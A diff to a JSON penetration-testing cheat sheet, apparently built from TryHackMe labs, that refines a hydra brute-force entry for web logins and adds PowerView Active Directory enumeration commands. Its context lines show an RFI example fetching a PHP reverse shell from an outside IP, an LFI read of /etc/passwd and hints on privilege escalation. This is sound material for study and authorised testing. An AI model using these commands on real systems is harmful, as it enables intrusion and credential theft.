@@ -71,9 +71,9 @@
     "init":
     [
         {
-            "command": "hydra -l [username] -P [password list] [ip address (only ip)] http-post-form \"[login page uri]:[Request Body]:[string that displays failed attempt]\"",
+            "command": "hydra -l [username] -P [password list] [ip address (only ip)] http-post-form \"[post uri]:[Request Body]:[string that displays failed attempt]\"",
             "section": "Initial Access",
-            "description": "Using hydra to brute force a login web page. Use BurpSuite and test a random user/pass combination to request body. Within the request portion, you should see where you tested a login combination. Replace the username you guessed with ^USER^ and the password you guessed with ^PASS^."
+            "description": "Using hydra to brute force a login web page. Use BurpSuite and test a random user/pass combination to get a request body. The post URI is at the top of the intercepted request in BurpSuite (starts line 1 after POST). Within the request portion, you should see where you tested a login combination. Replace the username you guessed with ^USER^ and the password you guessed with ^PASS^. The request body is the very bottom part."
         },
         {
             "command": "Remote/local file inclusion<br><br>RFI example: https://10.10.190.157/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.13.22.171/php-reverse-shell.php<br><br>LFI example: https://10.10.190.157/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../etc/passwd",
@@ -139,6 +139,21 @@
             "description": "[Windows] View user security privileges. '/all' will display all information in the current access token, including the current user name, security identifiers (SID), privileges, and groups that the current user belongs to. <br><br> According to TryHackMe, the most commonly abused privileges are: <br>-SeImpersonatePrivilege <br>-SeAssignPrimaryPrivilege <br>-SeTcbPrivilege <br>-SeBackupPrivilege <br>-SeRestorePrivilege <br>-SeCreateTokenPrivilege <br>-SeLoadDriverPrivilege <br>-SeTakeOwnershipPrivilege <br>-SeDebugPrivilege <br><br> THE TWO MAIN ONES TO CHECK FOR ARE 'SeImpersonatePrivilege' OR 'SeAssignPrimaryToken'! \"If you have SeAssignPrimaryToken or SeImpersonate privilege, you are SYSTEM.\" If you see these enabled check the JuicyPotato and PrintSpoofer commands in the privesc section."
         },
         {
+            "command": "PS> Get-NetComputer -fulldata | select operatingsystem",
+            "section": "Discovery",
+            "description": "Get a list of all operating systems on the domain."
+        },
+        {
+            "command": "PS> Get-NetUser | select cn",
+            "section": "Discovery",
+            "description": "Get a list of all users on the domain."
+        },
+        {
+            "command": "PS> Get-NetGroup",
+            "section": "Discovery",
+            "description": "Get a list of all groups on the domain."
+        },
+        {
             "command": "net user [user]",
             "section": "Discovery",
             "description": "[Windows] Gets information on the user, can be utilized to check what groups a user is in. Groups will be listed under Global Group Memberships and/or Local Group Memberships"
@@ -152,6 +167,16 @@
             "command": "Get-ADGroupMember [AD Group] | select name",
             "section": "Discovery",
             "description": "[Windows] PowerShell command that gets all members of the AD (Active Directory) group, then from that list only output the names."
+        },
+        {
+            "command": "PowerView Setup",
+            "section": "Discovery",
+            "description": "[Windows]. PowerView is a powershell tool to assist with the discovery phase of a Windows Active Directory Network. <br><br> 1. Get PowerView.ps1 (on github) to the victim machine <br><br> 2. Load powershell shell with execution policy bypassed 'powershell -ep bypass' <br><br> 3. Import the PowerView module '. .\\PowerView.ps1'"
+        },
+        {
+            "command": "PowerView Cheatsheet",
+            "section": "Discovery",
+            "description": "Check out this PowerView cheatsheet by HarmJ0y (the creator of PowerView) https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993"
         },
         {
             "command": "Using winPEAS",
